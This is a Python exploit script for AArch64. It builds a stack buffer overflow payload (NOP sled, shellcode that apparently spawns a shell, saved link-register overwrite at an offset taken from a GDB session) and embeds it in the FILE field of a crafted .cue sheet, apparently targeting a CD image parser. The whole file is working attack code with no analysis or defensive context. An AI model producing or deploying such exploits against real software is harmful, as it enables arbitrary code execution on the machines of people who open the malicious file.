#!/usr/bin/env python3
import struct

# -----------------------------
# VALUES FROM YOUR GDB SESSION
# -----------------------------
BUF_ADDR   = 0xffffffffdd28        # start of current_track_path
OFFSET_LR  = 2128                  # exact offset to saved LR
RET_ADDR   = BUF_ADDR + 0x200      # where shellcode lands safely (NOP sled)

# ----------------------------------
# AArch64 shellcode (36 bytes total)
# ----------------------------------
shellcode = (
    b"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2"
    b"\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa"
    b"\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2"
    b"\xe1\x66\x02\xd4"
)

# -----------------------
# NOP sled (AArch64 NOP)
# -----------------------
nop = b"\x1f\x20\x03\xd5"   # 4-byte ARM64 NOP

# Number of NOPs = fill buffer until shellcode fits before OFFSET_LR
nop_count = (OFFSET_LR - len(shellcode)) // len(nop)

nop_sled = nop * nop_count

# -----------------------
# Build payload correctly
# -----------------------
payload  = nop_sled + shellcode

# If any padding still required before LR overwrite:
if len(payload) < OFFSET_LR:
    payload += b"A" * (OFFSET_LR - len(payload))

# Now append saved LR overwrite
payload += struct.pack("<Q", RET_ADDR)

# -------------------------
# Save exploit binary blob
# -------------------------
with open("formats/cdfs/exploit.bin", "wb") as f:
    f.write(payload)

# -------------------------
# Write overflow.cue
# -------------------------
with open("formats/cdfs/overflow.cue", "wb") as f:
    f.write(b'FILE "')
    f.write(payload)              # raw payload stays inside FILE quotes
    f.write(b'" BINARY\n')
    f.write(b'TRACK 01 MODE1/2352\n')
    f.write(b'  INDEX 01 00:00:00\n')
